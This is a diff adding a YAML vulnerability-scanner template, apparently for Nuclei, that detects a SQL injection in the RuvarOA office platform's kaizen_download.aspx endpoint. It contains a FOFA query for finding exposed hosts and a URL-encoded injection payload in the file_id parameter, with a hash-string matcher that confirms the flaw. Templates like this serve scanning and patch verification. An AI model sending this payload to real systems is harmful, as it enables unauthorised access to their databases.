@@ -1,0 +1,25 @@
+id: ruvaroa-kaizen_download-sqli
+
+info:
+  name: "RuvarOA协同办公平台 kaizen_download 接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      RuvarOA协同办公平台 kaizen_download 接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现对目标数据库的未授权操控，包括但不限于数据篡改、记录增删及敏感信息泄露，最终导致数据完整性与机密性受损。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0-- HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'a0b923820dcc509a'
